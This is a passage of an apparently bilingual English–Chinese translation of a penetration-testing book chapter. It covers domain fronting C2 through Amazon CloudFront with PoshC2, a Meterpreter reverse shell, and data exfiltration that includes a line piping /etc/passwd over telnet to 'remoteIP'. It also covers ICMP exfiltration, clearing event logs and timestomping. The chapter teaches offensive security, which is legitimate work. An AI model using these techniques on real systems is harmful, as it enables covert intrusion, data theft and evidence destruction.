    C2，使用两种不同的方法。
- en: Using Amazon CloudFront for C2
  id: totrans-203
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 使用亚马逊 CloudFront 进行 C2
- en: 'In order to improve download speed, Amazon provides a **content delivery network**
    (**CDN**) on a globally distributed network of proxy servers that caches content
    such as bulky media and videos. Amazon CloudFront is a CDN offered by Amazon Web
    Services. The following steps are involved in creating a CDN:'
  id: totrans-204
  prefs: []
  type: TYPE_NORMAL
  zh: 为了提高下载速度，亚马逊提供了一个**内容分发网络**（**CDN**），该网络由全球分布的代理服务器组成，能够缓存媒体和视频等大型内容。亚马逊 CloudFront
    是由亚马逊 Web 服务提供的 CDN。创建 CDN 涉及以下步骤：
- en: Firstly, open an AWS account at [https://aws.amazon.com/](https://aws.amazon.com/)
  id: totrans-205
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 首先，在 [https://aws.amazon.com/](https://aws.amazon.com/) 上注册一个 AWS 帐户。
- en: Log in to your account at [https://console.aws.amazon.com/cloudfront/home](https://console.aws.amazon.com/cloudfront/home)
  id: totrans-206
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 登录到你的帐户：[https://console.aws.amazon.com/cloudfront/home](https://console.aws.amazon.com/cloudfront/home)
- en: Click **Get Started** under **Web** and select **Create distribution**.
  id: totrans-207
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 点击**开始使用**，选择**创建分发**。
- en: 'Fill in the correct details for each setting:'
  id: totrans-208
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 填写每个设置的正确详细信息：
- en: '**Origin Domain Name**: The domain name controlled by the attacker.'
  id: totrans-209
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**源域名**：攻击者控制的域名。'
- en: '**Origin Path**: The value can be set to the root, `/`.'
  id: totrans-210
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**源路径**：该值可以设置为根路径`/`。'
- en: '**Origin Path ID****:** Any custom name, such as demo or C2C.'
  id: totrans-211
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**源路径 ID**：任何自定义名称，如 demo 或 C2C。'
- en: '**Origin SSL Protocols**: By default, `TLS v1.2`, `TLS v1.1` and `TLS v1.0`
    are enabled.'
  id: totrans-212
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**源 SSL 协议**：默认情况下，`TLS v1.2`、`TLS v1.1` 和 `TLS v1.0` 都已启用。'
- en: '**Origin Protocol Policy**: There are three options: **HTTP**, **HTTPS**, and
    **Match Viewer**. I recommend using **Match Viewer**, which utilizes both **HTTPS**
    and **HTTP** depending on the protocol of the viewer’s request.'
  id: totrans-213
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**源协议策略**：有三个选项：**HTTP**、**HTTPS** 和 **匹配查看者**。我推荐使用**匹配查看者**，它根据查看者请求的协议使用**HTTPS**或**HTTP**。'
- en: '**Allowed HTTP Methods**: Select **GET**, **HEAD**, **OPTIONS, PUT,** **POST**,
    **PATCH**, **DELETE** in the **Default Cache** behavior settings.'
  id: totrans-214
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**允许的 HTTP 方法**：在**默认缓存**行为设置中选择**GET**、**HEAD**、**OPTIONS**、**PUT**、**POST**、**PATCH**、**DELETE**。'
- en: Ensure for **Cache and origin request settings** that you select **Use legacy
    cache settings**.
  id: totrans-215
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: 确保在**缓存和源请求设置**中选择**使用传统缓存设置**。
- en: Ensure **Forward Cookies** is set to **All**.
  id: totrans-216
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: 确保将**Forward Cookies**设置为**All**。
- en: Ensure **Query String Forwarding and Caching** is set to **Forward all, Cache
    based on all**.![](../Images/B17765_13_28.png)
  id: totrans-217
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: 确保将**查询字符串转发和缓存**设置为**转发所有，基于所有缓存**。![](../Images/B17765_13_28.png)
- en: 'Figure 13.28: Enabling the legacy cache settings and selecting the right options
    in AWS'
  id: totrans-218
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 13.28：在 AWS 中启用传统缓存设置并选择正确的选项
- en: Now you’re all set, so click **Create Distribution**. You should see the following
    screen, with the domain name showing as `<somerandom>.cloudfront.net`:![](../Images/B17765_13_29.png)
  id: totrans-219
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在你已经设置完成，点击**创建分发**。你应该能看到以下界面，域名显示为`<somerandom>.cloudfront.net`：![](../Images/B17765_13_29.png)
- en: 'Figure 13.29: Successfully creating a cloud front distribution'
  id: totrans-220
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 13.29：成功创建 CloudFront 分发
- en: It normally takes around 5 minutes or less to bring up the distribution.
  id: totrans-221
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 通常需要大约5分钟或更少的时间来启动分发。
- en: Once the distribution is created on AWS, you’re ready to customize the PoshC2
    agent to prepare for the attack. Before we fire up the PoshC2, we need to ensure
    that we identify a vulnerable domain that can be fronting our evil server.
  id: totrans-222
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 一旦在AWS上创建了分发，您就可以定制PoshC2代理为攻击做准备。在启动PoshC2之前，我们需要确保识别一个可以作为我们恶意服务器前端的易受攻击的域名。
- en: Finding frontable domains can be achieved using various scripts; here, we will
    use the script found at [https://github.com/rvrsh3ll/FindFrontableDomains](https://github.com/rvrsh3ll/FindFrontableDomains),
    and use one of the vulnerable hosts to perform the attack.
  id: totrans-223
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 查找可前端的域名可以通过使用各种脚本来实现；在这里，我们将使用在[https://github.com/rvrsh3ll/FindFrontableDomains](https://github.com/rvrsh3ll/FindFrontableDomains)上找到的脚本，并使用其中一个易受攻击的主机来执行攻击。
- en: Let’s now go ahead and create a new listener in PoshC2\. The first step is to
    create a PoshC2 project by running `posh-project –n domfront` and then make changes
    to the configuration file by locating to `/var/poshc2/domfront/config.yml` and
    editing `PayLoadCommsHost` to the vulnerable host, `DomainFrontHeader` to your
    AWS cloud distribution hostname, and then `BindPort` to `80`, as seen in *Figure
    13.30*:![Text  Description automatically generated](../Images/B17765_13_30.png)
  id: totrans-224
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在我们开始在PoshC2中创建一个新的监听器。第一步是通过运行`posh-project –n domfront`创建一个PoshC2项目，然后定位到`/var/poshc2/domfront/config.yml`并编辑配置文件，将`PayLoadCommsHost`修改为易受攻击的主机，将`DomainFrontHeader`修改为您的AWS云分发主机名，然后将`BindPort`设置为`80`，如*图13.30*所示：![文本描述自动生成](../Images/B17765_13_30.png)
- en: 'Figure 13.30: Configuring the PoshC2 to run on port 80 along with the domain
    front header with a vulnerable host'
  id: totrans-225
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图13.30：配置PoshC2在端口80上运行，并与易受攻击的主机一起使用域前端头
- en: Attackers can choose to run the C2 on port `443`. Ensure that you create the
    right certificate by using services such as Letsencrypt, or the CloudFront CDN
    will not be able to establish communication with the C2 server.
  id: totrans-226
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 攻击者可以选择在端口`443`上运行C2。请确保使用诸如Letsencrypt之类的服务创建正确的证书，否则CloudFront CDN将无法与C2服务器建立通信。
- en: Once all the settings are complete for our PoshC2, attackers should be able
    to see the following:![](../Images/B17765_13_31.png)
  id: totrans-227
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 一旦我们的PoshC2设置完成，攻击者应该能够看到以下内容：![](../Images/B17765_13_31.png)
- en: 'Figure 13.31: Launching PoshC2 using the AWS cloud distribution that we created'
  id: totrans-228
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图13.31：使用我们创建的AWS云分发启动PoshC2
- en: In this example, we will use the `vijayvelu.com` host to forward the domain
    request to our C2 server. Before connecting to Amazon Web Services, the application
    will perform a DNS lookup to resolve the domain name to a network IP address.
    The request will go directly to the `vijayvelu.com` host with the host header
    that we created in the Amazon CloudFront distribution.
  id: totrans-229
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 在这个例子中，我们将使用`vijayvelu.com`主机将域名请求转发到我们的C2服务器。在连接到Amazon Web Services之前，应用程序将执行DNS查找，将域名解析为网络IP地址。请求将直接发送到`vijayvelu.com`主机，并带有我们在Amazon
    CloudFront分发中创建的主机头。
- en: 'A packet capture of the request from Wireshark will look similar to *Figure
    13.32*:'
  id: totrans-230
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 从Wireshark捕获的请求数据包将类似于*图13.32*：
- en: '![](../Images/B17765_13_32.png)'
  id: totrans-231
  prefs:
  - PREF_IND
  type: TYPE_IMG
  zh: '![](../Images/B17765_13_32.png)'
- en: 'Figure 13.32: TCP stream of the communication of DomainFrontHost to our hosting
    server'
  id: totrans-232
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图13.32：DomainFrontHost与我们的托管服务器之间的TCP流通信
- en: Once the payload is executed on the victim machine, you should now be able to
    see the implant reporting without any trace of the attacker’s IP address on the
    victim network. All the traffic will look like legitimate connections to AWS and
    the domain that is fronted:![](../Images/B17765_13_33.png)
  id: totrans-233
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 一旦有效载荷在受害者机器上执行，您应该能够看到植入物报告，而受害者网络中不会有攻击者IP地址的任何痕迹。所有流量看起来都像是合法的连接到AWS以及所展示的域名：![](../Images/B17765_13_33.png)
- en: 'Figure 13.33: Successful implanting of the exploit to the target with domain
    fronting'
  id: totrans-234
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图13.33：成功将利用工具植入目标，并实现域前端攻击
- en: 'Attackers can also leverage Metasploit. We will create an exploit to provide
    a Meterpreter reverse HTTP shell using `msfvenom`, with the domain that does the
    forwarding, with our header injection as follows:'
  id: totrans-235
  prefs: []
  type: TYPE_NORMAL
  zh: 攻击者还可以利用Metasploit。我们将创建一个利用工具，通过`msfvenom`提供一个Meterpreter反向HTTP shell，使用进行转发的域名以及我们的头注入，如下所示：
- en: '[PRE17]'
  id: totrans-236
  prefs: []
  type: TYPE_PRE
  zh: '[PRE17]'
- en: 'Execution of this payload should get a reverse shell on the C2 server that
    is behind the Amazon CDN. This technique was actively utilized by APT29 (a Russian
    nation-state hacking group) to perform covert attacks:'
  id: totrans-237
  prefs: []
  type: TYPE_NORMAL
  zh: 执行此有效载荷应该会在位于Amazon CDN后的C2服务器上获取一个反向Shell。APT29（一个俄罗斯国家级黑客组织）曾积极利用这种技术执行隐蔽攻击：
- en: '![](../Images/B17765_13_34.png)Figure 13.34: Reverse shell to Meterpreter when
    the exploit was run on the target system using the domain fronting technique'
  id: totrans-238
  prefs: []
  type: TYPE_NORMAL
  zh: '![](../Images/B17765_13_34.png)图13.34：当在目标系统上使用域前置技术运行漏洞时，反向Shell到Meterpreter'
- en: Attackers may choose to utilize Microsoft CDN services for C2\. Unfortunately,
    the CDN options are not available for free-tier users; hence users may have to
    register with the pay-as-you-go option and then create a subscription and follow
    the instructions at [https://docs.microsoft.com/en-us/azure/cdn/cdn-create-endpoint-how-to](https://docs.microsoft.com/en-us/azure/cdn/cdn-create-endpoint-how-to).
    However, testers need to ensure that the domain name behind either Azure or Amazon
    has a valid A record. For Microsoft Azure, you also need to ensure that the CNAME
    is pointed to the right custom domain to make domain fronting work.
  id: totrans-239
  prefs: []
  type: TYPE_NORMAL
  zh: 攻击者可能选择利用微软CDN服务进行C2通信。不幸的是，免费层用户无法使用CDN选项，因此用户可能需要选择按需付费选项注册，并创建订阅，然后按照[https://docs.microsoft.com/en-us/azure/cdn/cdn-create-endpoint-how-to](https://docs.microsoft.com/en-us/azure/cdn/cdn-create-endpoint-how-to)上的说明操作。不过，测试人员需要确保Azure或Amazon背后的域名有有效的A记录。对于微软Azure，你还需要确保CNAME指向正确的自定义域名，以确保域名前置功能正常工作。
- en: Although many content providers are vulnerable to this type of attack, some
    of the content providers, such as Google, seem to have quickly fixed this attack
    by making major changes to their cloud infrastructure. For example, if Company
    A’s domain uses Amazon’s domain as a front, with an additional host header pointing
    to Company B, the request will be dropped at the first node of the CDN.
  id: totrans-240
  prefs: []
  type: TYPE_NORMAL
  zh: 尽管许多内容提供商容易受到此类攻击，但一些内容提供商，如Google，似乎已经通过对其云基础设施进行重大改动迅速修复了这一攻击。例如，如果A公司的域名使用了亚马逊的域名作为前置，并且额外的主机头指向B公司，请求将在CDN的第一个节点被丢弃。
- en: Similarly, other providers are trying to block these forward or fronting techniques
    by requiring an additional authorization token or another mechanism.
  id: totrans-241
  prefs: []
  type: TYPE_NORMAL
  zh: 类似地，其他提供商正尝试通过要求额外的授权令牌或其他机制来阻止这些前置技术或前置技术。
- en: Exfiltration of data
  id: totrans-242
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 数据外泄
- en: The unauthorized transfer of digital data from any environment is known as the
    exfiltration of data (or the extrusion of data). Once persistence is maintained
    on a compromised system, a set of tools can be utilized to exfiltrate data from
    highly secure environments.
  id: totrans-243
  prefs: []
  type: TYPE_NORMAL
  zh: 数字数据从任何环境中未经授权的转移被称为数据外泄（或数据挤出）。一旦在被攻陷的系统中维持持久性，可以利用一系列工具从高度安全的环境中外泄数据。
- en: In this section, we will explore different methods that attackers utilize to
    send files from internal networks to attacker-controlled systems.
  id: totrans-244
  prefs: []
  type: TYPE_NORMAL
  zh: 在本节中，我们将探索攻击者用来将文件从内部网络发送到攻击者控制系统的不同方法。
- en: Using existing system services (Telnet, RDP, and VNC)
  id: totrans-245
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 使用现有的系统服务（Telnet、RDP和VNC）
- en: Firstly, we will discuss some straightforward techniques for quickly grabbing
    files when access to compromised systems is time-limited. Attackers can simply
    open up a port using Netcat by running `nc -lvp 2323 > Exfilteredfile`, and then
    run `cat /etc/passwd | telnet remoteIP 8000` from the compromised Linux server.
  id: totrans-246
  prefs: []
  type: TYPE_NORMAL
  zh: 首先，我们将讨论一些简单的技术，用于在对受感染系统的访问时间有限的情况下快速抓取文件。攻击者可以通过运行`nc -lvp 2323 > Exfilteredfile`来使用Netcat打开一个端口，然后从受感染的Linux服务器运行`cat
    /etc/passwd | telnet remoteIP 8000`。
- en: 'This will display the entire contents of `etc/passwd` to the remote host. As
    an example, we are extracting a password list from the internal host to a remote
    Kali machine on AWS, as seen in *Figure 13.35*:'
  id: totrans-247
  prefs: []
  type: TYPE_NORMAL
  zh: 这将向远程主机显示`etc/passwd`的所有内容。作为示例，我们正在从内部主机提取密码列表到AWS上的远程Kali机器，如*图13.35*所示：
- en: '![](../Images/B17765_13_35.png)'
  id: totrans-248
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_13_35.png)'
- en: 'Figure 13.35: Exfiltration of data from a local Kali system to a remote Kali
    system using Telnet'
  id: totrans-249
  prefs: []
  type: TYPE_NORMAL
  zh: 图13.35：使用Telnet从本地Kali系统到远程Kali系统的数据外泄
- en: Another important and fairly simple technique used by attackers with access
    to any system on the network is to run `getgui` from the Meterpreter shell, which
    will enable the RDP. Once the RDP is enabled, attackers can configure their Windows
    attack to mount the local drive to the remote drive and exfiltrate all the files
    from the remote desktop to the local drive.
  id: totrans-250
  prefs: []
  type: TYPE_NORMAL
  zh: 另一种重要且相对简单的技术是，攻击者在网络中访问任意系统时，可以从Meterpreter shell中运行`getgui`，这将启用RDP。一旦RDP被启用，攻击者可以配置其Windows攻击，将本地驱动器挂载到远程驱动器上，并将所有文件从远程桌面外泄到本地驱动器。
- en: 'This can be achieved by going to **Remote Desktop Connection** and selecting
    **Show Options**, then **Local Resources**, then **Local devices and resources**,
    clicking **More**, and finally selecting the drive that you want to mount, as
    shown in *Figure 13.36*:'
  id: totrans-251
  prefs: []
  type: TYPE_NORMAL
  zh: 这可以通过进入**远程桌面连接**，选择**显示选项**，然后选择**本地资源**，接着选择**本地设备和资源**，点击**更多**，最后选择你想挂载的驱动器来实现，如*图13.36*所示：
- en: '![](../Images/B17765_13_36.png)'
  id: totrans-252
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_13_36.png)'
- en: 'Figure 13.36: Options in RDP settings to mount the drives'
  id: totrans-253
  prefs: []
  type: TYPE_NORMAL
  zh: 图13.36：RDP设置中挂载驱动器的选项
- en: 'This will mount the `D://` drive of the attacker’s local machine to the RDP
    system. This can be confirmed by logging in to the remote IP using the RDP connection.
    An additional drive (`X:`) should be mounted by default, as shown in *Figure 13.37*:'
  id: totrans-254
  prefs: []
  type: TYPE_NORMAL
  zh: 这将把攻击者本地机器的`D://`驱动器挂载到RDP系统上。可以通过使用RDP连接登录远程IP来确认这一点。默认情况下，应该会挂载一个额外的驱动器（`X:`），如*图13.37*所示：
- en: '![](../Images/B17765_13_37.png)'
  id: totrans-255
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_13_37.png)'
- en: 'Figure 13.37: Successfully mounting the attacker’s local drive to the remote
    desktop'
  id: totrans-256
  prefs: []
  type: TYPE_NORMAL
  zh: 图13.37：成功将攻击者的本地驱动器挂载到远程桌面
- en: Other traditional techniques involve setting up an SMB server and allowing anonymous
    access from compromised computers, or utilizing applications such as TeamViewer,
    the Skype Chrome plugin, Dropbox, Google Drive, OneDrive, WeTransfer, or any other
    one-click sharing service for bulk file transfers.
  id: totrans-257
  prefs: []
  type: TYPE_NORMAL
  zh: 其他传统技术包括设置SMB服务器并允许被攻陷计算机的匿名访问，或者使用如TeamViewer、Skype Chrome插件、Dropbox、Google
    Drive、OneDrive、WeTransfer等应用，或者任何其他一键共享服务来进行大文件传输。
- en: Using the ICMP protocol
  id: totrans-258
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 使用ICMP协议
- en: There are multiple ways to utilize the ICMP protocol to exfiltrate files, using
    tools such as `hping`, `nping`, and `ping`. In this section, we will utilize the
    `nping` utility to perform the data exfiltration of confidential documents using
    the ICMP protocol.
  id: totrans-259
  prefs: []
  type: TYPE_NORMAL
  zh: 有多种方法可以利用ICMP协议来外泄文件，使用诸如`hping`、`nping`和`ping`等工具。在本节中，我们将使用`nping`工具通过ICMP协议执行机密文件的外泄。
- en: 'In this example, we will use `tcpdump` to extract the data from the `pcap`
    dump file. Run the following command in the terminal to enable the listener:'
  id: totrans-260
  prefs: []
  type: TYPE_NORMAL
  zh: 在此示例中，我们将使用`tcpdump`从`pcap`转储文件中提取数据。在终端中运行以下命令以启用监听器：
- en: '[PRE18]'
  id: totrans-261
  prefs: []
  type: TYPE_PRE
  zh: '[PRE18]'
- en: 'Attackers should be able to see the following:'
  id: totrans-262
  prefs: []
  type: TYPE_NORMAL
  zh: 攻击者应能够看到以下内容：
- en: '![](../Images/B17765_13_38.png)'
  id: totrans-263
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_13_38.png)'
- en: Figure 13.38 Capturing the packets to receive contents
  id: totrans-264
  prefs: []
  type: TYPE_NORMAL
  zh: 图13.38 捕获数据包以接收内容
- en: '`10.10.10.12` is the target host that we are waiting to receive data from.
    On the sender’s side, once `hping3` is fired at the client side (`10.10.10.12`),
    you should receive the message `EOF reached, wait some second than press ctrl+c`,
    as shown in *Figure 13.39*. This indicates that the file has been exfiltrated
    to the target server via ICMP:'
  id: totrans-265
  prefs: []
  type: TYPE_NORMAL
  zh: '`10.10.10.12`是我们等待接收数据的目标主机。在发送方，一旦`hping3`命令发送到客户端（`10.10.10.12`），你应该会收到消息`EOF
    reached, wait some second than press ctrl+c`，如*图13.39*所示。这表明文件已经通过ICMP外泄到目标服务器：'
- en: '![](../Images/B17765_13_39.png)'
  id: totrans-266
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_13_39.png)'
- en: 'Figure 13.39: Sending the file over the ICMP using the hping3 utility'
  id: totrans-267
  prefs: []
  type: TYPE_NORMAL
  zh: 图13.39：使用hping3工具通过ICMP发送文件
- en: Close `tcpdump` using *Ctrl* + *C*. The next step is to remove the unwanted
    data from the `pcap` file so that we print only the specific hex value to a text
    file by running Wireshark or `tshark`.
  id: totrans-268
  prefs: []
  type: TYPE_NORMAL
  zh: 使用*Ctrl* + *C*关闭`tcpdump`。下一步是从`pcap`文件中删除不需要的数据，以便我们通过运行Wireshark或`tshark`仅将特定的十六进制值打印到文本文件中。
- en: 'The following is the `tshark` command to filter the data fields and print just
    the hex value from the `pcap` file:'
  id: totrans-269
  prefs: []
  type: TYPE_NORMAL
  zh: 以下是用于过滤数据字段并仅从`pcap`文件中打印十六进制值的`tshark`命令：
- en: '[PRE19]'
  id: totrans-270
  prefs: []
  type: TYPE_PRE
  zh: '[PRE19]'
- en: 'The same hex file can now be converted with the following one-line bash command
    by running `cat extfilterated_hex.txt | xxd –r –p`. Finally, you should be able
    to view the file contents, as shown in *Figure 13.40*:'
  id: totrans-271
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，可以通过运行`cat extfilterated_hex.txt | xxd –r –p`命令将相同的十六进制文件转换。最终，你应该能够查看文件内容，如*图13.40*所示：
- en: '![](../Images/B17765_13_40.png)'
  id: totrans-272
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_13_40.png)'
- en: 'Figure 13.40: Extraction of hex data from pcap and decoding using xxd'
  id: totrans-273
  prefs: []
  type: TYPE_NORMAL
  zh: 图13.40：从pcap中提取十六进制数据并使用xxd解码
- en: These techniques are being eased out by other sets of tools, such as utilizing
    TeamViewer, DropBox, and other cloud-hosting services.
  id: totrans-274
  prefs: []
  type: TYPE_NORMAL
  zh: 这些技术正逐渐被其他工具集所取代，例如使用TeamViewer、Dropbox和其他云托管服务。
- en: Hiding evidence of an attack
  id: totrans-275
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 隐藏攻击证据
- en: Once a system has been exploited, the attacker must cover their tracks to avoid
    detection, or at least make reconstruction of the event more difficult for the
    defender.
  id: totrans-276
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦系统被攻击者利用，攻击者必须掩盖自己的痕迹以避免被检测，或者至少让防御方重建事件变得更加困难。
- en: 'An attacker may completely delete the Windows event logs (if they are being
    actively retained on the compromised server). This can be done via a command shell
    to the system, using the following command:'
  id: totrans-277
  prefs: []
  type: TYPE_NORMAL
  zh: 攻击者可能完全删除 Windows 事件日志（如果它们在受害服务器上被积极保留）。这可以通过命令行界面执行，使用以下命令：
- en: '[PRE20]'
  id: totrans-278
  prefs: []
  type: TYPE_PRE
  zh: '[PRE20]'
- en: The command directs all of the logs to be deleted (`/a`), including all files
    from subfolders (`/s`). The `/q` option disables all of the queries, asking for
    a `yes` or `no` response, and the `/f` option forcibly removes the files, making
    recovery more difficult.
  id: totrans-279
  prefs: []
  type: TYPE_NORMAL
  zh: 该命令将指示删除所有日志（`/a`），包括子文件夹中的所有文件（`/s`）。`/q` 选项禁用所有询问，不再要求 `yes` 或 `no` 响应，`/f`
    选项强制删除文件，使恢复更加困难。
- en: To wipe out specific recorded files, attackers must keep track of all the activities
    that have been performed on the compromised system.
  id: totrans-280
  prefs: []
  type: TYPE_NORMAL
  zh: 为了抹掉特定记录的文件，攻击者必须跟踪所有在受害系统上执行的活动。
- en: 'This can also be done from the Meterpreter prompt by using `clearev`. As shown
    in *Figure 13.41*, this will clear the application, system, and security logs
    from the target (there are no options or arguments for this command):'
  id: totrans-281
  prefs: []
  type: TYPE_NORMAL
  zh: 这也可以通过 Meterpreter 提示符使用 `clearev` 来完成。如 *图 13.41* 所示，这将清除目标系统的应用程序、系统和安全日志（此命令没有选项或参数）：
- en: '![](../Images/B17765_13_41.png)'
  id: totrans-282
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_13_41.png)'
- en: 'Figure 13.41: Clearing the Event Logs in Windows'
  id: totrans-283
  prefs: []
  type: TYPE_NORMAL
  zh: 图 13.41：清除 Windows 事件日志
- en: Ordinarily, deleting a system log does not trigger any alerts to the user. In
    fact, most organizations configure logging so haphazardly that missing system
    logs are treated as a possible occurrence, and their loss is not investigated
    thoroughly.
  id: totrans-284
  prefs: []
  type: TYPE_NORMAL
  zh: 通常，删除系统日志不会触发任何用户警报。事实上，大多数组织配置日志记录时非常草率，以至于缺失的系统日志被视为一种可能发生的情况，而且不会进行彻底调查。
- en: Apart from the traditional logs, attackers might also consider removing the
    `PowerShell Operational log` from the victim systems.
  id: totrans-285
  prefs: []
  type: TYPE_NORMAL
  zh: 除了传统日志，攻击者还可能考虑从受害系统中删除 `PowerShell 操作日志`。
- en: 'Metasploit has an additional trick up its sleeve: the `timestomp` option allows
    an attacker to make changes to the MACE parameters of a file (the last modified,
    accessed, created, and MFT entry modified times of a file). Once a system has
    been compromised and a Meterpreter shell established, `timestomp` can be invoked,
    as shown in *Figure 13.42*:'
  id: totrans-286
  prefs: []
  type: TYPE_NORMAL
  zh: Metasploit 还有一个额外的技巧：`timestomp` 选项允许攻击者修改文件的 MACE 参数（文件的最后修改时间、访问时间、创建时间和 MFT
    条目修改时间）。一旦系统被攻破并且建立了 Meterpreter shell，可以调用 `timestomp`，如 *图 13.42* 所示：
- en: '![](../Images/B17765_13_42.png)'
  id: totrans-287
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_13_42.png)'
- en: 'Figure 13.42: Meterpreter timestomp options'
  id: totrans-288
  prefs: []
  type: TYPE_NORMAL
  zh: 图 13.42：Meterpreter timestomp 选项
- en: 'For example, `C:` of the compromised system contains a file named `README.txt`.
    The MACE values for this file indicate that it was created recently, as shown
    in *Figure 13.43*:'
  id: totrans-289
  prefs: []
  type: TYPE_NORMAL
  zh: 例如，受害系统的 `C:` 驱动器包含一个名为 `README.txt` 的文件。该文件的 MACE 值表明它最近被创建，如 *图 13.43* 所示：
- en: '![](../Images/B17765_13_43.png)'
  id: totrans-290
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_13_43.png)'
- en: 'Figure 13.43: Running timestomp on a specific local file'
  id: totrans-291
  prefs: []
  type: TYPE_NORMAL
  zh: 图 13.43：在特定本地文件上运行 timestomp
- en: If we wanted to hide this file, we could move it to a cluttered directory, such
    as `Windows\System32`. However, the file would be obvious to anyone who sorted
    the contents of that directory on the basis of the creation dates or another MAC-based
    variable.
  id: totrans-292
  prefs: []
  type: TYPE_NORMAL
  zh: 如果我们想隐藏这个文件，可以将它移动到一个杂乱的目录，例如 `Windows\System32`。然而，这个文件对任何按创建日期或其他基于 MAC 的变量排序该目录内容的人来说都将是显而易见的。
- en: 'Instead, you can change the timestamps of the file by running the following
    command:'
  id: totrans-293
  prefs: []
  type: TYPE_NORMAL
  zh: 相反，你可以通过运行以下命令来更改文件的时间戳：
- en: '[PRE21]'
  id: totrans-294
  prefs: []
  type: TYPE_PRE
  zh: '[PRE21]'
- en: 'This changes the timestamps of the `README.txt` file, as shown in *Figure 13.44*:'
  id: totrans-295
  prefs: []
  type: TYPE_NORMAL
  zh: 这将更改 `README.txt` 文件的时间戳，如 *图 13.44* 所示：
- en: '![](../Images/B17765_13_44.png)'
  id: totrans-296
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_13_44.png)'
- en: 'Figure 13.44: Modifying the metadata of the files to reflect false dates'
  id: totrans-297
  prefs: []
  type: TYPE_NORMAL
  zh: 图 13.44：修改文件的元数据以反映虚假的日期
- en: 'In order to completely foul up an investigation, an attacker may recursively
    change all of the set times in a directory or on a particular drive using the
    following command:'
  id: totrans-298
  prefs: []
  type: TYPE_NORMAL
  zh: 为了完全破坏调查，攻击者可能会使用以下命令递归地更改某个目录或特定驱动器中的所有时间：
- en: '[PRE22]'
  id: totrans-299
  prefs: []
  type: TYPE_PRE
  zh: '[PRE22]'
- en: The solution is not perfect. It is clear that an attack has occurred. Furthermore,
    timestamps can be retained in other locations on a hard drive and be accessible
    for investigation. If the target system is actively monitoring changes to system
    integrity using an intrusion detection system such as Tripwire, alerts of the
    timestomp activity will be generated. Therefore, destroying timestamps is of limited
    value when a truly stealthy approach is required.
  id: totrans-300
  prefs: []
  type: TYPE_NORMAL
  zh: 这个解决方案并不完美。很明显，攻击已经发生。此外，时间戳可以保存在硬盘的其他位置，并且可以供调查人员访问。如果目标系统正在通过入侵检测系统（如 Tripwire）主动监控系统完整性的变化，那么时间戳篡改活动会触发警报。因此，当需要真正隐秘的方式时，摧毁时间戳的价值有限。
- en: Summary
  id: totrans-301
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 总结
- en: In this chapter, we took a journey into different strategies used by attackers
    to maintain access to compromised environments, including domain fronting to hide
    the origin of the attack, and we also learned how to hide the evidence of an attack
    to cover our tracks and remain anonymous, which is the last step of the cyber
    kill chain methodology.
  id: totrans-302
  prefs: []
  type: TYPE_NORMAL
  zh: 在这一章中，我们深入探讨了攻击者用来保持对被攻陷环境访问的不同策略，包括通过域名前置隐藏攻击来源，同时我们也学习了如何隐藏攻击证据、掩盖踪迹并保持匿名，这是网络攻击杀伤链方法论的最后一步。
- en: We looked at how to use Netcat, Meterpreter, scheduled tasks, PowerShell Empire’s
    dbx and onedrive modules, and Covenant C2 and Poshc2 implants to maintain persistent
    agents on compromised systems, as well as how to exfiltrate data using traditional
    services such as DNS, ICMP, Telnet, RDP, and Netcat. We also learned how to find
    vulnerable domain fronting domains and use them for malicious activities using
    well-known CDNs such as Amazon and Azure.
  id: totrans-303
  prefs: []
  type: TYPE_NORMAL
